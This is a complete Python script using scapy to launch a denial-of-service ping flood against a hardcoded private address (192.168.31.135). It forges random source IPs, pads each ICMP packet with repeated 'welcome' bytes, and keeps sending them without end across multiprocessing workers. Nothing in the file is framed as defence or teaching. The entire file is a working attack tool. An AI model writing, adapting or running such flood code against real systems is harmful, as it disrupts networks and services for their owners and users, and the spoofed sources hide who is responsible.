import multiprocessing
from random import randint
from scapy.all import *


def random_ip():
    ip_part1 = randint(1, 255)
    ip_part2 = randint(1, 255)
    ip_part3 = randint(1, 255)
    ip_part4 = randint(1, 255)
    return str(ip_part1) + '.' + str(ip_part2) + '.' + str(ip_part3) + '.' + str(ip_part4)


def ping_sendone(host, random_source=True):
    id_ip = randint(1, 65535)  # 随机产生IP ID位
    id_ping = randint(1, 65535)  # 随机产生ping ID位
    seq_ping = randint(1, 65535)  # 随机产生ping序列号位
    if random_source == True:
        source_ip = random_ip()
        packet = IP(src=source_ip, dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
    else:
        packet = IP(dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome' * 100
    ping = send(packet, verbose=False)


def ping(host, random_source=True):
    for i in range(10000):
        if random_source == True:
            ping_sendone(host)
        else:
            ping_sendone(host, random_source=False)

def ping_Dos(host, pocesses=2, random_source=True):
    pool = multiprocessing.Pool(pocesses)
    while True:
        try:
            pool.apply_async(ping, (host,random_source))
        except KeyboardInterrupt:
            pool.terminate()

if __name__ == '__main__':
    ping_Dos('192.168.31.135', 2)